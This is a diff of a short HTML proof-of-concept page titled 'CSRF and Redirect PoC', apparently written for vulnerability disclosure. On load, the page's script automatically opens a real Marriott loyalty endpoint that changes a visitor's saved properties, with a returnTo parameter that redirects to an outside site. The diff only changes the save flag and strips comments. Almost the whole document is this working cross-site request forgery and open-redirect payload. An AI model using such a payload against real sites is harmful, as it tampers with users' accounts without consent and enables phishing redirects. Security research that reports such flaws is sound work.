@@ -7,14 +7,11 @@
     <h1>CSRF and Redirect PoC</h1>
 
     <script>
-        // Function to open the Marriott link in a new window after two seconds
         function openMarriottLink() {
             setTimeout(function() {
-                window.open("https://www.marriott.com/loyalty/myAccount/saveProperties.mi?save=true&marshaCode=HNMSI&returnTo=//google.com", "_blank");
-            }, 2000); // Delay of 2 seconds (2000 milliseconds)
+                window.open("https://www.marriott.com/loyalty/myAccount/saveProperties.mi?save=false&marshaCode=HNMSI&returnTo=//google.com", "_blank");
+            }, 2000);
         }
-
-        // Automatically call the openMarriottLink function when the page loads
         window.onload = function() {
             openMarriottLink();
         };
